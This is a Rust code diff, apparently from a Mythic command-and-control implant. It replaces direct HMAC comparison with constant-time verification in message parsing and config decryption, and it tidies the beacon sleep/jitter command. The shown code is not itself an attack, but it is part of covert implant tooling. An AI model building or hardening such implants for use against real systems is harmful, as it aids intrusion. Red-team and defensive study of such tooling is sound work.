@@ -185,6 +185,14 @@ fn hmac_sha256(key: &[u8], data: &[u8]) -> [u8; 32] {
     mac.finalize().into_bytes().into()
 }
 
+fn verify_hmac(key: &[u8], data: &[u8], expected: &[u8]) -> bool {
+    use hmac::{Hmac, Mac};
+    use sha2::Sha256;
+    let mut mac = Hmac::<Sha256>::new_from_slice(key).expect("HMAC key length");
+    mac.update(data);
+    mac.verify_slice(expected).is_ok()
+}
+
 /// Decode a base64-encoded 32-byte AES key (from Mythic AESPSK).
 pub fn decode_aes_key(b64_key: &str) -> Option<[u8; 32]> {
     use base64::{engine::general_purpose::STANDARD, Engine as _};
@@ -233,8 +241,7 @@ pub fn parse_mythic_message(raw: &str, key: &[u8; 32]) -> Option<String> {
     let iv_ct = &body[..hmac_offset];
     let received_hmac = &body[hmac_offset..];
 
-    let computed_hmac = hmac_sha256(key, iv_ct);
-    if computed_hmac != received_hmac {
+    if !verify_hmac(key, iv_ct, received_hmac) {
         return None;
     }
 
@@ -273,8 +280,7 @@ pub fn decrypt_config(enc_hex: &str, key: &[u8; 32]) -> Option<String> {
     let iv_ct = &data[..hmac_offset];
     let received_hmac = &data[hmac_offset..];
 
-    let computed_hmac = hmac_sha256(key, iv_ct);
-    if computed_hmac != received_hmac {
+    if !verify_hmac(key, iv_ct, received_hmac) {
         return None;
     }
 
@@ -619,15 +625,14 @@ pub fn upload_file(_args: &str) -> String {
 }
 
 pub fn handle_sleep_command(args: &str) -> String {
-    if args.is_empty() {
+    let parts: Vec<&str> = args.split_whitespace().collect();
+    if parts.is_empty() {
         return format!(
             "sleep: {}s, jitter: {}%",
             get_sleep_seconds(),
             get_jitter_percent()
         );
     }
-    let parts: Vec<&str> = args.split_whitespace().collect();
-    // Parse as f64 first — Mythic sends NUMBER params as floats (e.g. "5.0")
     if let Ok(s) = parts[0].parse::<f64>() {
         set_sleep_seconds(s as u64);
         if parts.len() > 1 {
